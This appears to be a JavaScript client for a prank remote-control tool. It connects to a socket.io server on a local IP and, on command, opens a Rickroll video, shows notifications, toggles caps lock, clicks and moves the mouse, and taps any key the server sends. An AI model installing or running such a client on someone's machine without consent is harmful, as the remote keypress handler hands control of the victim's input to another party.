const socket = io("ws://192.168.56.1:3000", {
    reconnectionDelayMax: 5000,
});

socket.on("connect", () => {
    console.log("Connected to the server");
})

socket.on("disconnect", () => {
    console.log("Disconnected from the server");
});

socket.on("message", async (message) => {
    try {
        console.log(`Received message: ${message}`);
        switch (message) {
            case 'rickroll':
                console.log("Rickroll detected");
            

                var url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
                var start = (process.platform == 'darwin'? 'open': process.platform == 'win32'? 'start': 'xdg-open');
                child_process.exec(start + ' ' + url);

                break;
            case 'notification':
                const ran = notifications();

                const tempFilePath = path.join(__dirname, 'temp_icon.png');
                fs.writeFileSync(tempFilePath, Buffer.from(ran.image, 'base64'));

                await notifier.notify(
                    {
                        subtitle: 'Notification from the server',
                        title: ran.title,
                        message: ran.message,
                        icon: tempFilePath,
                        sound: true,
                    }
                );

                setTimeout(() => {
                    fs.unlink(tempFilePath, (unlinkErr) => {
                            if (unlinkErr) {
                                console.error('Error deleting temporary file:', unlinkErr);
                            } else {
                                console.log('Temporary file deleted:', tempFilePath);
                            }
                        });
                }, 1000)

                break;
            case 'cap':
                robot.keyToggle('capslock', 'toggle');
                if (Math.random() < 0.5) {
                    robot.keyToggle('capslock', 'down');
                } else {
                    robot.keyToggle('capslock', 'up');
                }
                break;
            case 'click':
                console.log("Click detected");
                robot.mouseClick();
                break;
            case 'wiggle':
                console.log("Wiggle detected");
                const pos = robot.getMousePos();
                const x = pos.x + (Math.random() < 0.5 ? -10 : 10);
                const y = pos.y + (Math.random() < 0.5 ? -10 : 10);
                robot.moveMouse(x, y);
                break;
            default:
                console.log(message)
        }
    } catch (error) {
        console.error(`Error handling message ${message}:`, error);
    }
})

socket.on("keypress", (key) => {
    try {
        console.log(`Key pressed: ${key}`);
        robot.keyTap(key);
    } catch (error) {
        console.error(`Error pressing key ${key}:`, error);
    }
})

